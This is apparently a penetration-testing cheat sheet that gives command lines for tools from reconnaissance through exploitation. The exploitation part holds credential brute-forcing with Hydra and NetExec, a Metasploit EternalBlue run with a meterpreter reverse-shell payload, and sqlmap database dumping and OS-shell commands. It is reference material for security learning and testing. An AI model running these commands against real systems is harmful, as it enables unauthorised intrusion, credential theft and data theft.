## RECON FLOW

1. Nmap                     / Find targets & ports
2. Nuclei                   / Quick vuln scan
3. Nikto / WPScan           / Web-specific
4. Amass / theHarvester     / OSINT
5. Netexec                  / Internal enumeration
6. Hydra                    / Credential attacks
7. Metasploit               / Exploitation
8. SQLMap                   / Database attacks


###### ###### ###### ###### ###### ##
###### 1. Reconnaissance (OSINT) ####
###### ###### ###### ###### ###### ##

#
theHarvester
# OSINT Gathering

## Workflow
# Choose target domain
# Select data source (Google, Bing, etc.)
# Expand results (DNS, reverse lookup)
# Save findings

theHarvester -d example.com -b google
theHarvester -d example.com -b all -l 200
theHarvester -d example.com -b google -f results.html
theHarvester -d example.com -b google -n
theHarvester -d example.com -b google -c
theHarvester -d example.com -b google -j results.json

#
Amass
# Deep subdomain enumeration, passive and active

## Workflow
# Passive scan
# Active/brute-force expansion
# Analyze sources
# Export results

amass enum -passive -d example.com
amass enum -active -d example.com
amass enum -brute -d example.com
amass enum -src -d example.com
amass enum -o subdomains.txt -d example.com
amass enum -config config.ini -d example.com

###### ###### ###### ###### ###### ##
###### 2. Scanning & Enumeration ####
###### ###### ###### ###### ###### ##

#
NMAP
# Discovers hosts, open ports, services, and operating systems.

## Workflow
# Discover hosts
# Scan ports
# Identify services
# Run scripts

nmap -sn 192.168.1.0/24
nmap -sS 192.168.1.1
nmap -sV 192.168.1.1
nmap -p 1-65535 192.168.1.1
nmap -A 192.168.1.1
nmap -O 192.168.1.1
nmap -sU 192.168.1.1
nmap -sC 192.168.1.1
nmap -Pn 192.168.1.1
nmap -oN output.txt 192.168.1.1
nmap -sS -sV -sC -O -oA full_scan 192.168.1.1

#
NetExec
# Internal network Enumeration; SMB, LDAP, WinRM, other.

## Workflow
# Identify exposed services
# Test credentials
# Enumerate users/shares
# Attempt privilege actions

nxc smb 192.168.1.10
nxc smb 192.168.1.10 -u admin -p password
nxc smb 192.168.1.0/24 -u admin -p password
nxc smb 192.168.1.10 --shares
nxc smb 192.168.1.10 --users
nxc smb 192.168.1.10 --groups
nxc smb 192.168.1.10 --pass-pol
nxc smb 192.168.1.10 -u users.txt -p passwords.txt
nxc smb 192.168.1.10 -u user -p pass -d DOMAIN
nxc winrm 192.168.1.10 -u admin -p password
nxc rdp 192.168.1.10 -u admin -p password
nxc ldap 192.168.1.10 -u admin -p password

###### ###### ###### ###### ###### #####
###### 3. Vulnerability Identification #
###### ###### ###### ###### ###### #####

#
Nuclei
# CVE-based detection, scans targets using vulnerability templates

## Workflow
# Update templates
# Scan targets
# Filter severity
# Export results

nuclei -update-templates
nuclei -u https://example.com
nuclei -l targets.txt
nuclei -u https://example.com -t templates/
nuclei -u https://example.com -severity critical,high
nuclei -u https://example.com -tags cve
nuclei -u https://example.com -o results.txt
nuclei -u https://example.com -json
nuclei -u https://example.com -silent
nuclei -u https://target.com -rl 50             -Scan with rate limit
nuclei -u https://target.com -tags cve,rce      - Scan for specific vulnerability type

#
Nikto
# Web server scanner; misconfigurations and vulnerabilities

## Workflow
# Identify web server
# Run baseline scan
# Adjust tuning
# Export results

nikto -h http://example.com
nikto -h http://example.com -p 8080
nikto -h http://example.com -ssl
nikto -h http://example.com -Tuning 2
nikto -h http://example.com -o results.txt
nikto -h http://example.com -Format html
nikto -h http://example.com -Display V
nikto -h http://example.com -timeout 10
nikto -h http://example.com -C all
nikto -h http://example.com -ask no

# 
WPScan
# Wordpress Vulnerabilities Scanner

## Workflow
# Detect WordPress
# Enumerate users/plugins
# Identify vulnerabilities
# Attempt login attacks

wpscan --url https://example.com
wpscan --url https://example.com --enumerate u
wpscan --url https://example.com --enumerate p
wpscan --url https://example.com --enumerate t
wpscan --url https://example.com --enumerate vp
wpscan --url https://example.com --api-token YOUR_TOKEN
wpscan --url https://example.com -U users.txt -P passwords.txt

###### ###### ###### ###### ###### #####
###### 4. Explotiation #### ###### #####
###### ###### ###### ###### ###### #####

#
Hydra
# Login services brute-force attacker

## Workflow
# Identify login service
# Prepare wordlists
# Run attack
# Validate results

hydra -l admin -P passwords.txt ssh://192.168.1.1
hydra -L users.txt -P passwords.txt ftp://192.168.1.1
hydra -l admin -P passwords.txt smb://192.168.1.1
hydra -l admin -P passwords.txt -t 4 ssh://192.168.1.1

#
Metasploit
# Vulnerabilty exploiter

# Search exploit
# Configure target
# Set payload
# Execute
# Manage sessions

msfconsole
search exploit windows
use exploit/windows/smb/ms17_010_eternalblue
show options
set RHOSTS 192.168.1.10
set RPORT 445
set LHOST 192.168.1.5
set PAYLOAD windows/meterpreter/reverse_tcp
exploit
sessions
sessions -i 1
background

# 
SQLMap
# SQL Injection attack automater

## Workflow
# Identify injectable parameter
# Run scan
# Increase depth
# Extract data

sqlmap -u "http://target.com/page?id=1"
sqlmap -u "URL" --dbs
sqlmap -u "URL" -D database_name --tables
sqlmap -u "URL" -D database_name -T table_name --columns
sqlmap -u "URL" -D database_name -T table_name --dump
sqlmap -u "URL" --current-db
sqlmap -u "URL" --batch
sqlmap -u "URL" --level=5 --risk=3
sqlmap -u "URL" --os-shell

###### ###### ###### ###### ###### #######
###### 5. Advanced Tools #### ###### #####
###### ###### ###### ###### ###### #######

SpiderFoot
Automated OSINT collection with modular scanning.

Maltego
Graph-based intelligence analysis tool.

Shodan
Search engine for exposed internet-connected devices.

BeEF
Browser exploitation framework (requires client-side hook).
